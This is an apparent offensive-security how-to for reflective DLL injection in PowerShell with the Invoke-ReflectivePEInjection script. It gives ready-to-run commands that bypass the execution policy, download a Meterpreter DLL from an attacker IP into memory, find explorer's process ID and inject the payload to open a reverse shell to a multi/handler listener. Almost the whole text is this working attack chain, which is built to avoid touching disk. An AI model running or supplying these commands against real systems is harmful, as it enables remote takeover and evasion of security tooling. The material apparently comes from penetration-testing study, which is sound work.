# Reflective DLL Injection in PowerShell


## Informations

We'll reuse the PowerShell reflective DLL injection code (Invoke-ReflectivePEInjection) developed by the security researchers Joe Bialek and Matt Graeber.

The script performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file.

It has two separate modes : 

- The first is to reflectively load a DLL or EXE into the same process.
- The second is to load a DLL into a remote process.

We must specify a DLL or EXE as an array of bytes in memory, which allows us to download and execute it without touching the disk.

## Usage

1. Open a PowerShell window with "PowerShell -Exec Bypass" to allow script execution.

2. Once the window is open, we'll run the commands bellow, which will load the DLL into a byte array and retrieve the explorer ID.

```PowerShell
$bytes = (New-Object
System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
$procid = (Get-Process -Name explorer).Id

```

3. To use "Invoke-ReflectivePEInjection" we must first import it from its location with Import-Module

```PowerShell

Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

```

4. Next, we'll supply the byte array (-PEBytes) and process ID (-ProcId) and execute the script.

```PowerShell

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

```

This loads the DLL in memory and provides us with a reverse Meterpreter shell into our multi/handler listener.

## Notes

If the script produces an error, this does not affect the functionality of the script and can be ignored.

Note that the public version of this script fails on versions of Windows 10 1803 or newer due to the multiple instances of GetProcAddress in UnsafeNativeMethods.